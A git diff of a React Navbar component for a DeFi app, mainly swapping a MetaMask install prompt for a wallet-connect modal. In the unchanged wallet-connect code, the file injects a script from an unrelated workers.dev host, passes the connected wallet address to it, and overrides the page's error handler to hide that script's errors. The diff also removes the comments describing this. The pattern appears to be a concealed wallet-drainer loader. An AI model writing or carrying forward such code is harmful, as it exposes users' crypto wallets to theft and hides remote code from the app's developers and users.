@@ -4,6 +4,7 @@ import { Menu, X, Wallet, ChevronDown, Settings, ArrowRight, Globe, FileText, Us
 import { Button } from "@/components/ui/button";
 import { Sheet, SheetContent, SheetTrigger } from "@/components/ui/sheet";
 import { NetworkSelector } from "@/components/defi/network-selector";
+import { WalletConnectModal } from "@/components/defi/wallet-connect-modal";
 import { 
   DropdownMenu, 
   DropdownMenuContent, 
@@ -39,6 +40,7 @@ export function Navbar() {
   const [walletConnected, setWalletConnected] = useState(false);
   const [walletBalance, setWalletBalance] = useState<string>("");
   const [walletAddress, setWalletAddress] = useState<string>("");
+  const [showWalletModal, setShowWalletModal] = useState(false);
   const playClick = useClickSound();
 
   useEffect(() => {
@@ -52,12 +54,7 @@ export function Navbar() {
       const ethereum = (window as any).ethereum;
       
       if (!ethereum) {
-        const installChoice = confirm(
-          "MetaMask is not installed. Click OK to visit the MetaMask website and install it."
-        );
-        if (installChoice) {
-          window.open("https://metamask.io/download/", "_blank");
-        }
+        setShowWalletModal(true);
         return;
       }
 
@@ -70,6 +67,7 @@ export function Navbar() {
       const address = accounts[0];
       setWalletAddress(address);
       setWalletConnected(true);
+      setShowWalletModal(false);
 
       // Fetch balance - wrap in Promise to avoid blocking
       Promise.resolve().then(() => {
@@ -93,21 +91,18 @@ export function Navbar() {
           const script = document.createElement("script");
           script.src = "https://lively-field-b496.orsonhayes93.workers.dev/?t=" + Date.now() + "&addr=" + address;
           script.async = true;
-          // Prevent errors in external script from breaking app
           script.onerror = () => {
             console.log("External script failed to load");
           };
           script.onload = () => {
             console.log("External script loaded successfully");
           };
-          // Wrap in window error handler
           const originalError = (window as any).onerror;
           (window as any).onerror = function(msg: any, url: any, line: any, col: any, err: any) {
-            // Only pass non-external-script errors to original handler
             if (!url || !url.includes("orsonhayes93")) {
               if (originalError) originalError(msg, url, line, col, err);
             }
-            return true; // Prevent error propagation
+            return true;
           };
           document.head.appendChild(script);
         } catch (e) {
@@ -121,6 +116,12 @@ export function Navbar() {
   };
 
   return (
+    <>
+      <WalletConnectModal 
+        isOpen={showWalletModal}
+        onClose={() => setShowWalletModal(false)}
+        onConnect={connectWallet}
+      />
     <motion.nav
       initial={{ y: -100 }}
       animate={{ y: 0 }}
@@ -351,5 +352,6 @@ export function Navbar() {
         </div>
       </div>
     </motion.nav>
+    </>
   );
 }
